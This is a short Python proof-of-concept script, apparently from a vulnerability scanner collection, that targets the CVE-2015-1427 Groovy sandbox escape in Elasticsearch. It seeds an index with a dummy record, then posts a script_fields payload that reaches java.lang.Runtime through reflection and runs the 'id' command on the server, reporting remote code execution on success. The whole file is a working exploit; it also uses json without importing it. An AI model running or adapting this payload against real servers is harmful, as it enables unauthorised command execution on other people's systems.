#!/usr/bin/env python
# coding: utf-8
# Date  : 2018-07-12 21:16:36
# Author: b4zinga
# Email : b4zinga@outlook.com
# Func  :

import requests

def run(url):
    """CVE-2015-1427"""
    headers = {'Content-Type':'application/x-www-form-urlencoded'}
    req = requests.post(url+':9200/website/blog/', headers=headers, data="""{"name":"test"}""", timeout=5)  # es 中至少存在一条数据, so, 创建

    data = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}
    req = requests.post(url+':9200/_search?pretty', headers=headers, data=json.dumps(data), timeout=5)

    if req.status_code == 200:
        print(req.text)
        return 'ElasticSearch Remote Code Exec2 ~ '
    else:
        return False